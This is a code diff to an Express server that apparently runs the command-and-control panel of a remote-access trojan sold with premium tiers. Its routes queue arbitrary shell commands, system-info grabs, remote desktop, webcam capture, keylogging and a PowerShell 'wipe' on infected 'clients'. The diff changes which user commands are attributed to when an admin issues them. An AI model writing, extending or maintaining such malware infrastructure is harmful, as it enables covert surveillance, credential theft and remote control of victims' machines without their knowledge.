@@ -250,7 +250,7 @@ async function requireAuth(req, res, next) {
 
 async function requirePremium(req, res, next) {
   try {
-    if (req.user.isAdmin) return next(); // ADMIN BYPASS
+    if (req.user.isAdmin) return next();
 
     const row = await getOwnUser(req.user.uid);
     if (!row || !row.premium_until || Number(row.premium_until) < Date.now()) {
@@ -730,17 +730,18 @@ app.post('/api/clients/:id/exec', requireAuth, requirePremium, async (req, res) 
     return res.status(400).json({ error: 'bad line' });
 
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [clientId] : [clientId, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
 
   const [info] = await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, ?, ?, 'pending', ?)
-  `, [req.user.uid, clientId, shell, line, Date.now()]);
+  `, [ownerId, clientId, shell, line, Date.now()]);
 
   res.json({ ok: true, commandId: Number(info.insertId) });
 });
@@ -766,18 +767,19 @@ app.get('/api/clients/:id/commands', requireAuth, async (req, res) => {
 app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res) => {
   const clientId = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [clientId] : [clientId, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
 
   try {
     const [info] = await db.query(`
       INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
       VALUES (?, ?, 'sysinfo', '', 'pending', ?)
-    `, [req.user.uid, clientId, Date.now()]);
+    `, [ownerId, clientId, Date.now()]);
 
     const cmdId = Number(info.insertId);
     const deadline = Date.now() + 10000;
@@ -818,12 +820,13 @@ app.delete('/api/clients/:id', requireAuth, async (req, res) => {
 app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const cid = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
 
   const stPath = path.join(DOWNLOAD_DIR, 'st.jar');
   let needsBuild = !fs.existsSync(stPath);
@@ -845,7 +848,7 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const [info] = await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'powershell', ?, 'pending', ?)
-  `, [req.user.uid, cid, line, Date.now()]);
+  `, [ownerId, cid, line, Date.now()]);
 
   res.json({
     ok: true,
@@ -857,12 +860,14 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
 app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
+
   const cfg = {
     monitor:  Number(req.body.monitor  || 0),
     width:    Math.min(Math.max(Number(req.body.width  || 1280), 320), 3840),
@@ -875,35 +880,39 @@ app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, async (req, 
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', ?, 'pending', ?)
-  `, [req.user.uid, cid, JSON.stringify(cfg), Date.now()]);
+  `, [ownerId, cid, JSON.stringify(cfg), Date.now()]);
   res.json({ ok: true });
 });
 
 app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
+
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
-  `, [req.user.uid, cid, Date.now()]);
+  `, [ownerId, cid, Date.now()]);
   res.json({ ok: true });
 });
 
 app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
+
   const cfg = {
     camera:  Number(req.body.camera  || 0),
     width:   Math.min(Math.max(Number(req.body.width  || 640), 160), 1920),
@@ -914,55 +923,61 @@ app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, async (re
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'webcam', ?, 'pending', ?)
-  `, [req.user.uid, cid, JSON.stringify(cfg), Date.now()]);
+  `, [ownerId, cid, JSON.stringify(cfg), Date.now()]);
   res.json({ ok: true });
 });
 
 app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
+
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
-  `, [req.user.uid, cid, Date.now()]);
+  `, [ownerId, cid, Date.now()]);
   res.json({ ok: true });
 });
 
 app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
+
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'keylog', '{"start":true}', 'pending', ?)
-  `, [req.user.uid, cid, Date.now()]);
+  `, [ownerId, cid, Date.now()]);
   res.json({ ok: true });
 });
 
 app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
   const query = req.user.isAdmin
-      ? `SELECT id FROM clients WHERE id = ?`
-      : `SELECT id FROM clients WHERE id = ? AND user_id = ?`;
+      ? `SELECT id, user_id FROM clients WHERE id = ?`
+      : `SELECT id, user_id FROM clients WHERE id = ? AND user_id = ?`;
   const params = req.user.isAdmin ? [cid] : [cid, req.user.uid];
 
   const [client] = await db.query(query, params);
   if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const ownerId = client[0].user_id;
+
   await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'keylog', '{"stop":true}', 'pending', ?)
-  `, [req.user.uid, cid, Date.now()]);
+  `, [ownerId, cid, Date.now()]);
   res.json({ ok: true });
 });
 
@@ -1505,4 +1520,4 @@ function shutdown(sig) {
 process.on('SIGINT',  () => shutdown('SIGINT'));
 process.on('SIGTERM', () => shutdown('SIGTERM'));
 process.on('uncaughtException',  (e) => console.error('[uncaught]', e));
-app.on('unhandledRejection', (e) => console.error('[unhandled]', e));
+process.on('unhandledRejection', (e) => console.error('[unhandled]', e));
